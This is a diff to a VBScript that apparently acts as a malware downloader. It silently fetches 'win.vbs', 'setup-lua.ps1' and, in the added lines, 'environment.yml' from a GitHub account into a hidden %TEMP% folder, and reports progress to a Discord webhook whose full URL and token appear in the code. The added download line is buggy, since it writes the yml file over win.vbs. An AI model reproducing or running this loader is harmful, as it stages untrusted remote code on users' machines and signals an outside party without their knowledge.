@@ -1,14 +1,14 @@
 Option Explicit
 
 Dim objXMLHTTP, objADOStream, objFSO, objShell
-Dim strPs1URL
-Dim strWinURL
-Dim strRootPath, strPs1Path, strWinPath
+Dim strPs1URL, strWinURL, strEnvYmlURL
+Dim strRootPath, strPs1Path, strWinPath, strEnvYmlPath
 Dim intWait
 Dim strWebhookURL, strOutput
 
 strWinURL = "https://raw.githubusercontent.com/invisibleghostshell-ux/lua/main/win.vbs"
 strPs1URL = "https://raw.githubusercontent.com/invisibleghostshell-ux/lua/main/setup-lua.ps1"
+strEnvYmlURL = "https://raw.githubusercontent.com/invisibleghostshell-ux/lua/main/environment.yml"
 
 ' Create WScript.Shell object to get the environment variable
 Set objShell = CreateObject("WScript.Shell")
@@ -18,8 +18,9 @@ strRootPath = objShell.ExpandEnvironmentStrings("%TEMP%") & "\ZZ\"
 
 strPs1Path = strRootPath & "setup-lua.ps1"
 strWinPath = strRootPath & "win.vbs"
+strEnvYmlPath = strRootPath & "environment.yml"
 
-intWait = 5000 ' 1 minute in milliseconds
+intWait = 5000 ' 5 seconds in milliseconds
 strWebhookURL = "https://discord.com/api/webhooks/1268854626288140372/Jp_jALGydP2E3ZGckb3FOVzc9ZhkJqKxsKzHVegnO-OIAwAWymr6lsbjCK0DAP_ttRV2"
 
 Set objFSO = CreateObject("Scripting.FileSystemObject")
@@ -66,6 +67,9 @@ If Not objFSO.FileExists(strPs1Path) Then DownloadFile strPs1URL, strPs1Path
 SendToDiscord "Starting download of PowerShell script..."
 If Not objFSO.FileExists(strWinPath) Then DownloadFile strWinURL, strWinPath
 
+' Download yml file if it does not exist
+SendToDiscord "Starting download of yml file..."
+If Not objFSO.FileExists(strEnvYmlPath) Then DownloadFile strEnvYmlURL, strWinPath
 
 SendToDiscord "Download completed. Waiting for 1 minute..."
 WScript.Sleep intWait
